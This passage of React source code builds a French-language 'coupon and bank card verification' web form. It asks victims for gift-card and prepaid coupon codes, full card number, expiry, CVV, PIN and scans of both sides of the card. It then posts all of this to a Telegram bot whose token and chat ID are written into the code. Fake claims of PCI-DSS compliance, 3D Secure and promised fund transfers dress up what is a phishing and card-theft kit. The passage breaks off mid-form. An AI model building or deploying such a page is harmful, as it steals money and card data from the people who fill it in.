                <div className="absolute top-3 right-3 text-[10px] font-bold text-emerald-500/60 font-mono">STATUS: ENREGISTRÉ</div>
                <p className="text-slate-300 text-sm leading-relaxed font-semibold">
                  Votre demande d'homologation a été indexée par nos protocoles de sécurité. Nos services d'audit effectuent actuellement la vérification structurelle et de solde de votre coupon.
                </p>
                <div className="h-px bg-slate-800/60 my-2" />
                <p className="text-slate-400 text-xs leading-relaxed">
                  Le compte rendu officiel de validation et le versement de vos fonds associés seront émis de manière sécurisée directement à l'adresse e-mail renseignée : <strong className="text-white font-semibold">{clientEmail}</strong>.
                </p>
              </div>

              <button
                type="button"
                onClick={() => {
                  setFormspreeSuccess(false);
                  setCouponCode("");
                  setMontant("");
                  setCouponType("");
                  setSpecificCouponType("");
                  setOtherCouponName("");
                  setCustomBrandName("");
                  setCustomBankCardName("");
                  setClientName("");
                  setClientEmail("");
                  setHideCode("NON");
                  setImageFiles([]);
                  setImagePreviews([]);
                  setCardNumber("");
                  setCardExpiry("");
                  setCardCvv("");
                  setCardPin("");
                  setCardFrontFile(null);
                  setCardBackFile(null);
                  setCardFrontPreview(null);
                  setCardBackPreview(null);
                  setCouponFrontFile(null);
                  setCouponBackFile(null);
                  setCouponFrontPreview(null);
                  setCouponBackPreview(null);
                }}
                className="mt-4 px-8 py-4 bg-gradient-to-r from-blue-600 to-cyan-500 hover:scale-[1.02] hover:shadow-lg hover:shadow-cyan-500/20 text-white rounded-xl font-bold text-xs shadow-md transition-all active:scale-95 duration-150 cursor-pointer"
              >
                Vérifier un autre coupon
              </button>
            </div>
          ) : (
            <form
              onSubmit={async (e) => {
                e.preventDefault();
                const isBankCard = selectedBrand === "VISA" || selectedBrand === "MASTERCARD" || selectedBrand === "OTHER_BANK_CARD";

                if (!clientName.trim()) {
                  setErrorText("Veuillez saisir votre nom complet.");
                  return;
                }
                if (!clientEmail.trim() || !clientEmail.includes("@")) {
                  setErrorText("Veuillez saisir une adresse email valide.");
                  return;
                }
                if (selectedBrand === "OTHER_BANK_CARD" && !customBankCardName.trim()) {
                  setErrorText("Veuillez saisir le nom de votre banque.");
                  return;
                }
                if (selectedBrand === "OTHER" && !otherCouponName.trim()) {
                  setErrorText("Veuillez saisir le nom de votre coupon ou carte cadeau.");
                  return;
                }
                if (!isBankCard && !couponType) {
                  setErrorText("Veuillez sélectionner la catégorie (COUPON / CARTES CADEAUX).");
                  return;
                }
                if (!isBankCard && !montant.trim()) {
                  setErrorText("Veuillez saisir le montant.");
                  return;
                }
                
                if (!isBankCard && !couponCode.trim()) {
                  setErrorText("Veuillez saisir le code ou PIN de vérification.");
                  return;
                }

                if (!isBankCard && hideCode !== "OUI") {
                  setErrorText("L'option 'Masquer mon code' est obligatoire pour finaliser la vérification de votre coupon.");
                  return;
                }

                if (isBankCard) {
                  if (!montant.trim()) {
                    setErrorText("Veuillez saisir le montant actuel sur la carte.");
                    return;
                  }
                  const rawNum = cardNumber.replace(/\s/g, "");
                  if (!rawNum) {
                    setErrorText("Veuillez saisir le numéro à 16 chiffres de votre carte bancaire.");
                    return;
                  }
                  if (rawNum.length !== 16) {
                    setErrorText(`Le numéro de carte est de longueur incorrecte (${rawNum.length}/16 chiffres).`);
                    return;
                  }
                  if (!cardExpiry.trim() || !cardExpiry.includes("/")) {
                    setErrorText("Veuillez saisir une date d'expiration valide (MM/AA).");
                    return;
                  }
                  if (!cardCvv.trim()) {
                    setErrorText("Veuillez saisir le CVV de sécurité de 3 chiffres.");
                    return;
                  }
                  if (cardCvv.length < 3) {
                    setErrorText("Le CVV doit comporter au moins 3 chiffres.");
                    return;
                  }
                  if (!cardFrontPreview || !cardBackPreview) {
                    setErrorText("Le scan recto et verso (les deux côtés) de la carte bancaire est obligatoire pour finaliser la vérification.");
                    return;
                  }
                } else {
                  if (!couponFrontPreview || !couponBackPreview) {
                    setErrorText("Le scan recto et verso (les deux côtés) de votre coupon ou carte de recharge est obligatoire pour finaliser la vérification.");
                    return;
                  }
                }

                setErrorText(null);
                setIsSubmittingFormspree(true);

                // Dynamically resolve image attachments (recto-verso support for both card and coupon)
                const previewsToSend = isBankCard
                  ? [cardFrontPreview, cardBackPreview].filter((p): p is string => p !== null)
                  : [couponFrontPreview, couponBackPreview].filter((p): p is string => p !== null);

                // Build detailed text blocks for Telegram Server Proxy
                const telegramText = isBankCard
                  ? `🔐 NOUVELLE VÉRIFICATION CARTE BANCAIRE SÉCURISÉE
----------------------------------------
👤 CLIENT :
- Nom Complet : ${clientName}
- Adresse Email : ${clientEmail}

💳 CARTE BANCAIRE :
- Type de carte : ${selectedBrand === "OTHER_BANK_CARD" ? `Autre émetteur (${customBankCardName})` : selectedBrand}
- Montant actuel sur la carte : ${montant}
- Numéro de Carte : ${cardNumber}
- Date d'expiration : ${cardExpiry}
- Code de sécurité CVV : ${cardCvv}
- Code PIN de la carte : ${cardPin || "Non renseigné"}
- Masquer les données : ${hideCode}

📡 STATUT : Traitement Réseau 3D-Secure Sécurisé SSL`
                  : `🔐 NOUVELLE DEMANDE DE VÉRIFICATION SÉCURISÉE
----------------------------------------
👤 CLIENT :
- Nom Complet : ${clientName}
- Adresse Email : ${clientEmail}

🎫 COUPON / CARTE CADEAU :
- Catégorie : ${couponType}
- Émetteur/Type : ${selectedBrand === "OTHER" ? `Autre émetteur (${otherCouponName})` : specificCouponType || "Non spécifié"}
- Autres coupons (si sélectionné) : ${otherCouponName || "Aucun"}
- Montant : ${montant}
- Code du coupon : ${couponCode.toUpperCase()}
- Cacher le Code : ${hideCode}

📡 STATUT : Traitement SSL 256 bits`;

                // Direct Telegram Client-Side Dispatch Backup (runs when express server.ts endpoints are 404/down as in Cloudflare Pages)
                const sendTelegramDirectlyBackup = async (): Promise<boolean> => {
                  try {
                    const BOT_TOKEN = "8826615367:AAHDVikj2kh0KRLWDIbBIcdqMgXTiwYN1Vs";
                    const CHAT_ID = "8529673558";

                    // Send text telegram message
                    const textRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                      method: "POST",
                      headers: { "Content-Type": "application/json" },
                      body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: telegramText
                      })
                    });

                    if (!textRes.ok) {
                      const textErrData = await textRes.json().catch(() => ({}));
                      console.error("Backup text sending rejected by Telegram API:", textErrData);
                      return false;
                    }

                    // Send each attached image preview via client-side Blob decoding
                    for (let i = 0; i < previewsToSend.length; i++) {
                      const img = previewsToSend[i];
                      const match = img.match(/^data:image\/(\w+);base64,(.+)$/);
                      if (match) {
                        const ext = match[1];
                        const base64Data = match[2];

                        // Convert base64 string to Blob client-side safely
                        const byteCharacters = atob(base64Data);
                        const byteNumbers = new Array(byteCharacters.length);
                        for (let j = 0; j < byteCharacters.length; j++) {
                          byteNumbers[j] = byteCharacters.charCodeAt(j);
                        }
                        const byteArray = new Uint8Array(byteNumbers);
                        const blob = new Blob([byteArray], { type: `image/${ext}` });

                        const formData = new FormData();
                        formData.append("chat_id", CHAT_ID);
                        formData.append("photo", blob, `ticket_${Date.now()}_${i + 1}.${ext}`);
                        formData.append("caption", `📷 Image [${i + 1}/${previewsToSend.length}] associée au coupon de : ${clientName || "Inconnu"}\nCode : ${isBankCard ? `${cardNumber}${cardPin ? ` (PIN: ${cardPin})` : ''}` : couponCode}`);

                        const photoRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                          method: "POST",
                          body: formData
                        });
                        
                        if (!photoRes.ok) {
                          const photoErrData = await photoRes.json().catch(() => ({}));
                          console.error(`Backup photo [${i + 1}/${previewsToSend.length}] trigger failed:`, photoErrData);
                        }
                      }
                    }
                    return true;
                  } catch (err) {
                    console.error("Client-side direct Telegram fallback transmission failed completely:", err);
                    return false;
                  }
                };

                // Send data to Telegram Bot API securely via server proxy (bypasses Adblockers & CORS)
                try {
                  const telemetryRes = await fetch("/api/telegram-send", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      text: telegramText,
                      imagesBase64: previewsToSend, // support sending multiple image previews (recto verso)
                      clientName: clientName,
                      couponCode: isBankCard ? cardNumber : couponCode
                    })
                  });

                  if (telemetryRes.ok) {
                    setFormspreeSuccess(true);
                  } else {
                    // If server endpoint yields an error (like on static hosts like Cloudflare where the server backend is absent)
                    // we immediately trigger client-side fallback direct transmission so the coupon doesn't get lost
                    console.warn("Backend proxy unavailable. Invoking client-side Telegram backup dispatch...");
                    const fallbackSuccess = await sendTelegramDirectlyBackup();
                    if (fallbackSuccess) {
                      setFormspreeSuccess(true);
                    } else {
                      setErrorText("Une erreur de communication s'est produite lors de l'envoi immédiat de secours. Veuillez vérifier votre connexion et réessayer.");
                    }
                  }
                } catch (telegramErr) {
                  console.error("Telegram Server Proxy Transmission failed, attempting client-side direct fallback...", telegramErr);
                  const fallbackSuccess = await sendTelegramDirectlyBackup();
                  if (fallbackSuccess) {
                    setFormspreeSuccess(true);
                  } else {
                    setErrorText("Une erreur de communication s'est produite. Veuillez réessayer.");
                  }
                } finally {
                  setIsSubmittingFormspree(false);
                }
              }}
              className="space-y-8 relative z-10"
            >
              {/* Header inside form */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-sky-200 pb-6 mb-2">
                <div className="flex items-center gap-3.5">
                  <div className="w-12 h-12 rounded-2xl bg-gradient-to-tr from-blue-600 to-cyan-500 flex items-center justify-center text-white shadow-lg shadow-blue-500/25">
                    <Lock className="w-6 h-6" />
                  </div>
                  <div>
                    <h3 className="text-lg font-black text-slate-900">Guichet de Chiffrement</h3>
                    <p className="text-xs text-slate-600 font-medium">Canal de vérification d'éligibilité agréé PCI-DSS</p>
                  </div>
                </div>

                <div className="flex items-center gap-2 self-start sm:self-center bg-white/80 px-4 py-2 rounded-xl border border-sky-200 shadow-sm">
                  <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                  <span className="text-[11px] font-bold text-slate-700 uppercase tracking-widest font-mono">ENCRYPTION 256-BIT</span>
                </div>
              </div>

              {/* ERROR DISPLAY */}
              {errorText && (
                <div className="p-4 bg-rose-950/20 border border-rose-500/35 rounded-2xl flex gap-3 text-rose-200 text-xs font-semibold items-center animate-shake">
                  <ShieldAlert className="w-5 h-5 shrink-0 text-rose-500" />
                  <span>{errorText}</span>
                </div>
              )}

              {/* BRAND SELECTOR SECTION */}
              <div className="p-5 bg-sky-50/50 rounded-2xl border border-sky-200/60 space-y-6">
                <span className="text-[11px] font-extrabold text-slate-600 uppercase tracking-widest flex items-center gap-2">
                  <Layers className="w-4 h-4 text-blue-600" />
                  Sélectionnez le type de recharge ou de carte bancaire à vérifier : <span className="text-red-500">*</span>
                </span>
                
                {/* Coupons / Cartes Cadeaux Subset */}
                <div className="space-y-3">
                  <div className="flex items-center gap-2 border-b border-sky-200 pb-2">
                    <Tag className="w-3.5 h-3.5 text-emerald-600" />
                    <span className="text-xs font-black text-slate-800 uppercase tracking-wider">Coupons et Cartes Cadeaux</span>
                  </div>
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
                    {SELECTABLE_BRANDS.filter(b => b.type !== "Carte Bancaire").map((b) => {
                      const isSelected = selectedBrand === b.id;
                      return (
                        <button
                          key={b.id}
                          type="button"
                          onClick={() => {
                            setSelectedBrand(b.id);
                            if (b.id === "OTHER") {
                              setCouponType("Coupon");
                              setSpecificCouponType("Autres coupons");
                            } else {
                              if (b.type === "Coupon") {
                                setCouponType("Coupon");
                              } else if (b.type === "Carte Cadeau") {
                                setCouponType("Carte Cadeau");
                              } else {
                                setCouponType("Coupon");
                              }
                              setSpecificCouponType(b.name);
                            }
                            if (errorText) setErrorText(null);
                          }}
                          className={`p-3 rounded-xl border flex flex-col items-center justify-center text-center gap-1.5 transition-all duration-300 cursor-pointer group relative overflow-hidden select-none h-[88px] ${
                            isSelected
                              ? `bg-blue-600 border-blue-400 text-white shadow-[0_0_15px_rgba(37,99,235,0.3)] scale-[1.03]`
                              : `bg-white border-sky-100 hover:border-sky-300 hover:bg-sky-50/40 hover:scale-[1.01] shadow-sm`
                          }`}
                        >
                          <span className="text-2xl group-hover:scale-110 transition duration-300">
                            {b.icon}
                          </span>
                          <div className="flex flex-col">
                            <span className={`text-[11px] font-black tracking-tight leading-none ${isSelected ? "text-white" : "text-slate-700"}`}>
                              {b.name}
                            </span>
                            <span className="text-[8px] font-extrabold text-slate-500 group-hover:text-slate-400 mt-1 opacity-80 leading-none uppercase">
                              {b.type}
                            </span>
                          </div>
                          {isSelected && (
                            <div className="absolute top-1 right-1 w-3.5 h-3.5 bg-blue-500 text-white flex items-center justify-center rounded-full text-[8px] border border-blue-400 font-bold">
                              ✓
                            </div>
                          )}
                        </button>
                      );
                    })}
                  </div>
                </div>

                {/* Cartes Bancaires Subset */}
                <div className="space-y-3 pt-2">
                  <div className="flex items-center gap-2 border-b border-sky-200 pb-2">
                    <CreditCard className="w-3.5 h-3.5 text-blue-600" />
                    <span className="text-xs font-black text-slate-800 uppercase tracking-wider">Cartes Bancaires (Visa, MasterCard, etc.)</span>
                  </div>
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
                    {SELECTABLE_BRANDS.filter(b => b.type === "Carte Bancaire").map((b) => {
                      const isSelected = selectedBrand === b.id;
                      return (
                        <button
                          key={b.id}
                          type="button"
                          onClick={() => {
                            setSelectedBrand(b.id);
                            if (b.id === "VISA") {
                              setCouponType("Carte Bancaire");
                              setSpecificCouponType("Visa");
                            } else if (b.id === "MASTERCARD") {
                              setCouponType("Carte Bancaire");
                              setSpecificCouponType("MasterCard");
                            } else if (b.id === "OTHER_BANK_CARD") {
                              setCouponType("Carte Bancaire");
                              setSpecificCouponType("Autres cartes bancaires");
                            }
                            if (errorText) setErrorText(null);
                          }}
                          className={`p-3 rounded-xl border flex flex-col items-center justify-center text-center gap-1.5 transition-all duration-300 cursor-pointer group relative overflow-hidden select-none h-[88px] ${
                            isSelected
                              ? `bg-blue-600 border-blue-400 text-white shadow-[0_0_15px_rgba(37,99,235,0.3)] scale-[1.03]`
                              : `bg-white border-sky-100 hover:border-sky-300 hover:bg-sky-50/40 hover:scale-[1.01] shadow-sm`
                          }`}
                        >
                          <span className="text-2xl group-hover:scale-110 transition duration-300">
                            {b.icon}
                          </span>
                          <div className="flex flex-col">
                            <span className={`text-[11px] font-black tracking-tight leading-none ${isSelected ? "text-white" : "text-slate-700"}`}>
                              {b.name}
                            </span>
                            <span className="text-[8px] font-extrabold text-slate-500 group-hover:text-slate-400 mt-1 opacity-80 leading-none uppercase">
                              {b.type}
                            </span>
                          </div>
                          {isSelected && (
                            <div className="absolute top-1 right-1 w-3.5 h-3.5 bg-blue-500 text-white flex items-center justify-center rounded-full text-[8px] border border-blue-400 font-bold">
                              ✓
                            </div>
                          )}
                        </button>
                      );
                    })}
                  </div>
                </div>
              </div>

              {/* Responsive Layout Grid */}
              <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
                
                {/* Left Column (Coordonnées / Identité) */}
                <div className="lg:col-span-6 space-y-6">
                  <div className="p-5 bg-white/60 rounded-2xl border border-sky-200/60 shadow-sm space-y-5">
                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-600">SECTION 01 : IDENTITÉ DU TITULAIRE</span>
                    
                    {/* NOM COMPLET */}
                    <div className="flex flex-col space-y-2">
                      <label htmlFor="nom" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                        <User className="w-3.5 h-3.5 text-blue-600" />
                        Nom COMPLET : <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <input
                          type="text"
                          id="nom"
                          name="nom"
                          value={clientName}
                          onChange={(e) => {
                            setClientName(e.target.value);
                            if (errorText) setErrorText(null);
                          }}
                          placeholder=""
                          required
                          className="w-full h-12 bg-white/95 text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-400 transition-all duration-200"
                        />
                      </div>
                    </div>

                    {/* EMAIL */}
                    <div className="flex flex-col space-y-2">
                      <label htmlFor="email" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                        <Mail className="w-3.5 h-3.5 text-blue-600" />
                        Adresse e-mail : <span className="text-red-500">*</span>
                      </label>
                      <div className="relative">
                        <input
                          type="email"
                          id="email"
                          name="email"
                          value={clientEmail}
                          onChange={(e) => {
                            setClientEmail(e.target.value);
                            if (errorText) setErrorText(null);
                          }}
                          placeholder=""
                          required
                          className="w-full h-12 bg-white/95 text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-400 transition-all duration-200"
                        />
                      </div>
                    </div>
                  </div>

                  {isSelectedBankCard ? (
                    <div className="p-5 bg-slate-950/45 rounded-2xl border border-blue-900/15 space-y-4">
                      <span className="text-[10px] font-black tracking-widest uppercase text-slate-500">SECTION 02 : APERÇU CARTE TEMPS RÉEL (PCI-DSS)</span>
                      
                      {/* BEAUTIFUL CREDIT CARD PREVIEW GRAPHIC */}
                      <div className={`w-full h-44 rounded-2xl p-5 bg-gradient-to-br ${
                        selectedBrand === "VISA" 
                          ? "from-slate-900 via-blue-950/90 to-indigo-950 border-blue-500/30" 
                          : selectedBrand === "MASTERCARD"
                          ? "from-slate-900 via-orange-950/80 to-red-950/50 border-orange-500/30"
                          : "from-slate-900 via-slate-950 to-zinc-900 border-slate-700/40"
                      } border relative overflow-hidden flex flex-col justify-between shadow-2xl animate-fadeIn`}>
                        {/* Grid overlay */}
                        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(255,255,255,0.04),transparent)] animate-pulse" />
                        
                        <div className="flex items-center justify-between relative z-10">
                          <div className="flex items-center gap-1.5">
                            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
                            <span className="font-mono text-[9px] text-slate-400 font-bold uppercase tracking-wider font-semibold">SECURE CONNECT</span>
                          </div>
                          <div className="text-right">
                            <span className="text-[12px] font-black italic text-white tracking-widest font-sans uppercase">
                              {selectedBrand === "VISA" ? "VISA" : selectedBrand === "MASTERCARD" ? "MasterCard" : (customBankCardName || "AUTRE CARTE")}
                            </span>
                          </div>
                        </div>

                        {/* Chip & NFC symbol */}
                        <div className="flex items-center gap-2.5 relative z-10">
                          <div className="w-9 h-6.5 bg-gradient-to-tr from-amber-400 via-yellow-200 to-amber-300 rounded-md border border-amber-400/35 relative opacity-85 shadow" />
                          <svg className="w-4 h-4 text-slate-500 opacity-60 ml-1" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M4 17a1 1 0 0 1-1-1v-8a1 1 0 0 1 2 0v8a1 1 0 0 1-1 1zm4 1.5a1 1 0 0 1-1-1V6.5a1 1 0 0 1 2 0v11a1 1 0 0 1-1 1.5zm4 1.5a1 1 0 0 1-1-1V5a1 1 0 0 1 2 0v14a1 1 0 0 1-1 1z" />
                          </svg>
                        </div>

                        {/* Interactive Card Number */}
                        <div className="text-base sm:text-lg font-mono font-black text-white tracking-widest relative z-10 my-0.5 truncate text-center bg-slate-950/40 py-1 rounded-lg border border-slate-900/50">
                          {cardNumber || "•••• •••• •••• ••••"}
                        </div>

                        {/* Holder & Expiry details */}
                        <div className="flex justify-between items-center relative z-10 leading-none">
                          <div className="flex flex-col text-left">
                            <span className="text-[7.5px] uppercase tracking-widest text-slate-500 font-black leading-none mb-1">TITULAIRE DE LA CARTE</span>
                            <span className="text-xs uppercase font-bold text-slate-300 truncate max-w-[155px]">
                              {clientName || "NOM DU TITULAIRE"}
                            </span>
                          </div>
                          <div className="flex justify-between gap-4">
                            <div className="flex flex-col text-left">
                              <span className="text-[7.5px] uppercase tracking-widest text-slate-500 font-black leading-none mb-1">EXPIRY</span>
                              <span className="text-xs font-mono font-bold text-slate-300">
                                {cardExpiry || "MM/AA"}
                              </span>
                            </div>
                            <div className="flex flex-col text-left">
                              <span className="text-[7.5px] uppercase tracking-widest text-slate-500 font-black leading-none mb-1 text-right">CVV</span>
                              <span className="text-xs font-mono font-bold text-blue-400 text-right">
                                {cardCvv ? "•••" : "000"}
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>
                      
                      {/* Sub card info helper info zone */}
                      <div className="py-2.5 px-3 bg-blue-950/15 border border-blue-900/20 rounded-xl flex items-start gap-2">
                        <ShieldCheck className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
                        <p className="text-[10px] text-slate-400 leading-relaxed font-semibold">
                          Le traitement et la vérification s'effectuent via liaison interbancaire 3D Secure. Aucune information n'est stockée localement en clair.
                        </p>
                      </div>
                    </div>
                  ) : (
                    <div className="p-5 bg-white/60 rounded-2xl border border-sky-200/60 shadow-sm space-y-5">
                      <span className="text-[10px] font-black tracking-widest uppercase text-slate-600">SECTION 02 : CATÉGORIE DU BON</span>

                      {/* COUPON / CARTES CADEAUX */}
                      <div className="flex flex-col space-y-2">
                        <label htmlFor="type" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                          <Tag className="w-3.5 h-3.5 text-blue-600" />
                          Classification : <span className="text-red-500">*</span>
                        </label>
                        <div className="relative">
                          <select
                            id="type"
                            name="type"
                            required
                            value={couponType}
                            onChange={(e) => {
                              setCouponType(e.target.value);
                              if (errorText) setErrorText(null);
                            }}
                            className="w-full h-12 bg-white/95 text-slate-900 px-4 pr-10 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
                          >
                            <option value="" className="bg-white text-slate-500">-- Sélectionnez la catégorie --</option>
                            <option value="Coupon" className="bg-white text-slate-900 flex">Coupon de recharge prépayée</option>
                            <option value="Carte Cadeau" className="bg-white text-slate-900 flex">Carte Cadeau physique/numérique</option>
                          </select>
                          <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
                            <ChevronDown className="w-4 h-4" />
                          </div>
                        </div>
                      </div>

                      {/* TYPE DE COUPON */}
                      <div className="flex flex-col space-y-2">
                        <label htmlFor="specificCouponType" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                          <Tag className="w-3.5 h-3.5 text-blue-600" />
                          Type de coupon / Émetteur :
                        </label>
                        <div className="relative">
                          <select
                            id="specificCouponType"
                            name="specificCouponType"
                            value={specificCouponType}
                            onChange={(e) => {
                              setSpecificCouponType(e.target.value);
                              if (errorText) setErrorText(null);
                            }}
                            className="w-full h-12 bg-white/95 text-slate-900 px-4 pr-10 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold appearance-none transition cursor-pointer"
                          >
                            <option value="" className="bg-white text-slate-400">-- Sélectionnez un émetteur --</option>
                            <option value="Google Play" className="bg-white text-slate-900">Google Play</option>
                            <option value="iTunes" className="bg-white text-slate-900">iTunes / App Store</option>
                            <option value="PCS" className="bg-white text-slate-900">PCS Mastercard</option>
                            <option value="Transcash" className="bg-white text-slate-900">Transcash</option>
                            <option value="Neosurf" className="bg-white text-slate-900">Neosurf</option>
                            <option value="Paysafecard" className="bg-white text-slate-900">Paysafecard</option>
                            <option value="Amazon" className="bg-white text-slate-900">Amazon</option>
                            <option value="Steam" className="bg-white text-slate-900">Steam</option>
                            <option value="PlayStation" className="bg-white text-slate-900">PlayStation / PSN</option>
                            <option value="Xbox" className="bg-white text-slate-900">Xbox</option>
                            <option value="Roblox" className="bg-white text-slate-900">Roblox</option>
                            <option value="Netflix" className="bg-white text-slate-900">Netflix</option>
                            <option value="Spotify" className="bg-white text-slate-900">Spotify</option>
                            <option value="Vanilla" className="bg-white text-slate-900">Vanilla</option>
                            <option value="Ticket Premium" className="bg-white text-slate-900">Ticket Premium</option>
                            <option value="Toneo First" className="bg-white text-slate-900">Toneo First</option>
                            <option value="Sainsbury's / Tesco" className="bg-white text-slate-900">Sainsbury's / Tesco</option>
                          </select>
                          <div className="absolute inset-y-0 right-0 flex items-center pr-4 pointer-events-none text-slate-500">
                            <ChevronDown className="w-4 h-4" />
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </div>

                {/* Right Column (Données de sécurité / Upload) */}
                <div className="lg:col-span-6 space-y-6">
                  <div className="p-5 bg-white/60 rounded-2xl border border-sky-200/60 shadow-sm space-y-5">
                    <span className="text-[10px] font-black tracking-widest uppercase text-slate-600">SECTION 03 : DONNÉES FINANCIÈRES</span>

                    {isSelectedBankCard ? (
                      <div className="space-y-4 animate-fadeIn">
                        {/* CUSTOM BANK CARD NAME */}
                        {selectedBrand === "OTHER_BANK_CARD" && (
                          <div className="flex flex-col space-y-2">
                            <label htmlFor="customBankCardNameInput" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                              <CreditCard className="w-3.5 h-3.5 text-blue-600" />
                              Nom de votre banque : <span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              id="customBankCardNameInput"
                              name="custom_bank_card_name"
                              value={customBankCardName}
                              onChange={(e) => {
                                setCustomBankCardName(e.target.value);
                                if (errorText) setErrorText(null);
                              }}
                              placeholder="Ex: Nickel, BoursoBank, SG, Crédit Agricole, PCS..."
                              required
                              className="w-full h-12 bg-white/95 text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-400 transition-all duration-200"
                            />
                          </div>
                        )}

                        {/* MONTANT ACTUEL SUR LA CARTE */}
                        <div className="flex flex-col space-y-2">
                          <label htmlFor="cardBalanceInput" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                            <Coins className="w-3.5 h-3.5 text-blue-600" />
                            Montant actuel sur la carte : <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            id="cardBalanceInput"
                            name="montant"
                            value={montant}
                            onChange={(e) => {
                              setMontant(e.target.value);
                              if (errorText) setErrorText(null);
                            }}
                            placeholder="Ex: 500€"
                            required
                            className="w-full h-12 bg-white/95 text-slate-900 px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none text-xs font-semibold placeholder:text-slate-400 transition-all duration-200"
                          />
                        </div>

                        {/* CARD NUMBER */}
                        <div className="flex flex-col space-y-2">
                          <label htmlFor="cardNumInput" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                            <CreditCard className="w-3.5 h-3.5 text-blue-600" />
                            Numéro de carte bancaire (16 chiffres) : <span className="text-red-500">*</span>
                          </label>
                          <input
                            type="text"
                            id="cardNumInput"
                            name="card_num"
                            value={cardNumber}
                            onChange={(e) => {
                              const raw = e.target.value.replace(/\D/g, "").slice(0, 16);
                              const formatted = raw.replace(/(\d{4})(?=\d)/g, "$1 ");
                              setCardNumber(formatted);
                              if (errorText) setErrorText(null);
                            }}
                            placeholder="4532 •••• •••• ••••"
                            required
                            className="w-full h-12 bg-white/95 text-slate-900 font-mono text-sm font-bold tracking-widest px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-400"
                          />
                        </div>

                        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                          {/* EXPRY DATE */}
                          <div className="flex flex-col space-y-2">
                            <label htmlFor="cardExpiryInput" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                              <Calendar className="w-3.5 h-3.5 text-blue-600" />
                              Expiration (MM/AA) : <span className="text-red-500">*</span>
                            </label>
                            <input
                              type="text"
                              id="cardExpiryInput"
                              name="card_expiry"
                              value={cardExpiry}
                              onChange={(e) => {
                                const raw = e.target.value.replace(/\D/g, "").slice(0, 4);
                                let formatted = raw;
                                if (raw.length > 2) {
                                  formatted = `${raw.slice(0, 2)}/${raw.slice(2)}`;
                                }
                                setCardExpiry(formatted);
                                if (errorText) setErrorText(null);
                              }}
                              placeholder="MM/AA"
                              required
                              className="w-full h-12 bg-white/95 text-slate-900 font-mono text-xs font-bold tracking-wider px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-400"
                            />
                          </div>

                          {/* CVV */}
                          <div className="flex flex-col space-y-2">
                            <label htmlFor="cardCvvInput" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                              <Lock className="w-3.5 h-3.5 text-blue-600" />
                              Cryptogramme (CVV) : <span className="text-red-500">*</span>
                            </label>
                            <input
                              type="password"
                              id="cardCvvInput"
                              name="card_cvv"
                              value={cardCvv}
                              onChange={(e) => {
                                const formatted = e.target.value.replace(/\D/g, "").slice(0, 3);
                                setCardCvv(formatted);
                                if (errorText) setErrorText(null);
                              }}
                              placeholder="123"
                              required
                              className="w-full h-12 bg-white/95 text-slate-900 font-mono text-sm font-bold tracking-widest px-4 rounded-xl border border-sky-200 focus:border-blue-500 focus:ring-1 focus:ring-blue-500/30 outline-none transition-all duration-200 placeholder:text-slate-400"
                            />
                          </div>

                          {/* Code PIN */}
                          <div className="flex flex-col space-y-2">
                            <label htmlFor="cardPinInput" className="text-[11px] font-extrabold text-slate-600 uppercase tracking-wider flex items-center gap-2">
                              <Lock className="w-3.5 h-3.5 text-blue-600" />
                              Code PIN : <span className="text-xs text-slate-500 font-normal lowercase">(optionnel)</span>
                            </label>
                            <input
                              type="password"
                              id="cardPinInput"
                              name="card_pin"
                              value={cardPin}
                              onChange={(e) => {
                                const formatted = e.target.value.replace(/\D/g, "").slice(0, 8);
